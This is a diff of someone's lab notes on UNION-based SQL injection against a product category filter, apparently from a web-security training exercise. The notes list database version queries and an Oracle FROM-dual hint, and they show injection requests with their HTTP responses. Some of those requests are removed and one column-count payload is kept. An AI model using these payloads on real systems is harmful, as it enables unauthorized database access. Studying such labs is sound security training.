@@ -52,12 +52,8 @@ Microsoft, MySQL: 	SELECT @@version
 PostgreSQL: 	SELECT version() 
 A. Oracle 
 Hint: On Oracle databases, every SELECT statement must specify a table to select FROM. If your UNION SELECT attack does not query from a table, you will still need to include the FROM keyword followed by a valid table name. 
-When you UNION you need to return the correct amount of columns and data type this is why belows are failing:
+UNION needs to return the correct amount of columns and data type.
 We have an idea of where the data is at we need to weaponize an exploit: Playing a bit with not enough data
-GET /filter?category=Corporate+gifts' UNION SELECT NULL -- HTTP/1.1   400 bad request
-GET /filter?category=Corporate+gifts HTTP/1.1                         200 Good Request
-GET /filter?category=Corporate+gifts UNION SELECT NULL; HTTP/1.1         400
-GET /filter?category=Corporate+gifts' UNION SELECT NULL;-- HTTP/1.1    400
 Get our count:
 GET /filter?category=Corporate+gifts'+UNION+SELECT+'NULL','NULL'+FROM+dual-- HTTP/1.1   200 OK we have two columns of data. 
 We may want to know Types of data sent:
